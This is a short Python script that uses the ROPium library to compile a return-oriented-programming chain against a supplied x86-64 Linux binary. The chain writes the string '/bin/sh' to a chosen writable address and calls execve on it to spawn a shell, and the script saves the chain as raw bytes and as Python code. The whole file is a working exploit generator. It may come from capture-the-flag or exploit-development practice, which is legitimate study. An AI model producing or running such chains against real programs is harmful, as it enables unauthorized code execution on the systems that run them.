import sys
from ropium import *

binary = sys.argv[1]
ropchain = sys.argv[2]
script = sys.argv[3]
rwaddr = sys.argv[4]

rop = ROPium(ARCH.X64)
rop.abi = ABI.X64_SYSTEM_V
rop.os = OS.LINUX

rop.load(binary)

chain = rop.compile('[{}] = "/bin/sh\x00"'.format(rwaddr))
chain += rop.compile('sys_execve({}, 0, 0)'.format(rwaddr))

with open(ropchain, 'wb') as f:
    f.write(chain.dump('raw'))

with open(script, 'w') as f:
    f.write(chain.dump('python'))

